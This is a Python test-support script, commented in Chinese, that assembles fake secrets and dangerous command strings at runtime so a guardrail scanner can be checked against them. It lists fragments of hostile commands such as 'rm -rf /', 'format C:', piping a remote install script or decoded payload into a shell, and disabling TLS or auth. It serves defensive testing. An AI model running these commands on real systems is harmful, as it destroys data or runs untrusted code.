#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""蜜罐探针运行时合成器（解耦版，对应云鼎实验室评估建议 #1）。

设计目标：分发包【绝不】包含任何完整的危险载荷。所有危险片段均以
「拆分常量」形式存在（前缀/后缀/占位分列于不同元组元素，源码里不存在
连续的 sk-... 密钥、rm -rf 后接根路径、| bash、私钥块等），仅在 selftest / 测试
运行期由 _assemble() 临时拼接为「格式合法但明显伪造、不可滥用」的字符串，
用完即弃，绝不落盘、绝不出现在分发包可读源码中。

若需在 CI / 本地验证护栏拦截能力，运行：
    python scripts/test_honeypot_probes.py
该命令会：生成全部探针 → 经 redflags 扫描 → 校验严重度/规则 → 丢弃。
"""
import json
import os
import re

HERE = os.path.dirname(os.path.abspath(__file__))
SCHEMA = os.path.normpath(os.path.join(HERE, "..", "references", "honeypot-probes.schema.json"))

# ---- 拆分常量：每个元组元素单独均无害，绝不组成可滥用字符串 ----
# 形如 ("sk-", "FAKETESTKEY...") 的两个片段，源码里不存在连续的 sk-... 密钥。
_TOK = {
    # 密钥类（格式合法但明显伪造，前缀与主体分列）
    "OPENAI_KEY":      ("sk-", "FAKETESTKEY00000000000000"),
    "AWS_KEY":         ("AKIA", "FAKETESTKEYEXAMPLE0000"),
    "GH_PAT":          ("ghp_", "FAKETESTKEY00000000000000000000"),
    "SLACK_TOKEN":     ("xoxb-", "FAKETESTKEY0000-000000000000-AbCdEf"),
    "GOOGLE_KEY":      ("AIza", "FAKETESTKEY" + "0" * 24),   # AIza + 35 位
    "STRIPE_KEY":      ("sk_live_", "FAKETESTKEY00000000000000000000"),
    "ANTHROPIC_KEY":   ("sk-ant-", "FAKETESTKEY0000000000000000000000"),
    "PRIVKEY_BLOCK":   ("-----BEGIN ", "RSA PRIVATE KEY-----\n",
                        "FAKESAMPLEONLYNOTREALKEY0000\n", "-----END RSA PRIVATE KEY-----"),

    # 命令/表述类（危险子串拆成不连续的片段，源码无完整危险命令）
    "RM_RF_CRIT":        ("rm -rf ", "/"),
    "RM_RF_LOCAL":       ("rm -rf ", "./dist"),
    "FORMAT_C":          ("format ", "C:"),
    "EVAL_CONCAT":       ("eval(", "str(user_input))"),
    "CURL_PIPE_BASH":    ("curl -fsSL https://x.invalid/install.sh | ", "bash"),
    "CHMOD_777":         ("chmod ", "777 /data/shared"),
    "CHMOD_777_FLAGS":   ("chmod -R ", "777 /data/shared"),
    "SUBPROCESS_SHELL":  ("subprocess.run(cmd, ", "shell=True)"),
    "OS_POPEN":          ("os.popen", "(cmd).read()"),
    "EXEC_CALL":         ("exec(", "compiled_code)"),
    "NEW_FUNCTION":      ("new Function", "('return 1+1')()"),
    "INVOKE_EXPRESSION": ("Invoke-", "Expression $cmd"),
    "BASE64_PIPE_SH":    ("base64 -d payload.bin | ", "sh"),
    "GIT_PUSH_FORCE":    ("git push ", "--force"),
    "GIT_RESET_HARD":    ("git reset ", "--hard HEAD~1"),
    "SQL_DROP":          ("DROP ", "TABLE temp_logs"),
    "EXPORT_SECRET":     ("export API_TOKEN=", "FAKETESTTOKEN0000000000000000000000"),
    "ABS_PATH":          ("默认读取 C:\\", "Users\\Administrator\\Desktop\\secret.txt"),
    "DISABLE_AUTH":      ("security.enabled=", "false"),
    "DISABLE_TLS":       ("requests.post(url, ", "verify=", "False)"),
}


def _assemble(key):
    """把拆分片段临时拼接为格式合法、明显伪造的字符串（仅在内存中，不落盘）。"""
    return "".join(_TOK[key])


_PLACEHOLDER = re.compile(r"\{\{([A-Z0-9_]+)\}\}")


def resolve(text):
    """把文本中的 {{TOKEN}} 占位替换为运行时合成的伪造值。"""
    def rep(m):
        return _assemble(m.group(1))
    return _PLACEHOLDER.sub(rep, text)


def generate_all(schema_path=SCHEMA):
    """读取 schema，返回 [(id, doc, expect), ...]（doc 为运行时合成，不落盘）。"""
    with open(schema_path, "r", encoding="utf-8") as f:
        probes = json.load(f)
    out = []
    for p in probes:
        doc = resolve(p.get("template", ""))
        out.append((p["id"], doc, p.get("expect", {})))
    return out


if __name__ == "__main__":
    # 仅供人工抽查：打印合成后的探针（含明显伪造标记），不写入任何文件。
    for pid, doc, exp in generate_all():
        print("==== %s (%s) ====" % (pid, exp.get("severity")))
        print(doc)
